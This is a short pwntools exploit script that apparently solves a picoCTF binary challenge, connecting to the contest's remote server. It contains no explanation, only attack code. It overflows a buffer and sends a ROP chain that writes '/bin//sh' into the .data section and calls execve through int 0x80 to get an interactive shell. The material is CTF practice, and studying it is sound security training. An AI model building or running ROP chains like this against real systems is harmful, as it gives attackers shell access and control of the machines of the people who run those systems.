from pwn import *

p = remote("saturn.picoctf.net", 60138)#process('./vuln')
#gdb.attach(p, gdbscript='break *vuln+59')
b = b''
b += b'A' * 12
b += b'B' * 4
b += p32(0x80583c9)#pop edx
b += p32(0x80e5060)#@.data
b += p32(0x41414141)#padding

b += p32(0x80583c9)
b += p32(0x80e5060)
b += p32(0x41414141)

b += p32(0x80b074a)#pop eax
b += b'/bin'
b += p32(0x08059102) # mov dword ptr [edx], eax ; ret
b += p32(0x080583c9) # pop edx ; pop ebx ; ret
b += p32(0x080e5064) # @ .data + 4
b += p32(0x41414141) # padding
b += p32(0x080b074a) # pop eax ; ret
b += b'//sh'
b += p32(0x08059102) # mov dword ptr [edx], eax ; ret
b += p32(0x080583c9) # pop edx ; pop ebx ; ret
b += p32(0x080e5068) # @ .data + 8
b += p32(0x41414141) # padding
b += p32(0x0804fb90) # xor eax, eax ; ret
b += p32(0x08059102) # mov dword ptr [edx], eax ; ret
b += p32(0x08049022) # pop ebx ; ret
b += p32(0x080e5060) # @ .data
b += p32(0x08049e39) # pop ecx ; ret
b += p32(0x080e5068) # @ .data + 8
b += p32(0x080583c9) # pop edx ; pop ebx ; ret
b += p32(0x080e5068) # @ .data + 8
b += p32(0x080e5060) # padding without overwrite ebx
b += p32(0x080b074a) # pop eax ; ret
b += p32(11)
b += p32(0x8071650) #int 0x80 ; ret syscall?
p.sendline(b)
p.interactive()
